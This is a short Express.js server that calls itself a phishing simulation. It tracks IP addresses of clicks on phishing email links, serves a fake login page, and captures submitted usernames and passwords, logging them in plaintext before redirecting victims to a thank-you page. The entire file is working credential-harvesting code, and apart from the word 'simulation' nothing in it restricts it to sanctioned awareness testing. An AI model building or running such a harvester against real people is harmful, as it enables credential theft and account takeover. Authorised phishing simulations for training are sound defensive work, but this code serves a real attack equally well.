const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse URL-encoded form data
app.use(bodyParser.urlencoded({ extended: false }));

// Route to track clicks on phishing email links
app.get('/click', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const timestamp = new Date();

  // Log click info (consider storing securely in database or file)
  console.log(`Phishing link clicked from IP: ${ip} at ${timestamp}`);

  // Redirect user to phishing login page
  res.redirect('/login');
});

// Serve static files (your phishing page and thankyou page) from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to capture POSTed credentials
app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Log credentials to console (replace with secure storage in production)
  console.log('Captured credentials:', { username, password });

  // Redirect user to thank you page after capturing credentials
  res.redirect('/thankyou.html');
});

app.listen(port, () => {
  console.log(`Phishing simulation server running at http://localhost:${port}`);
});
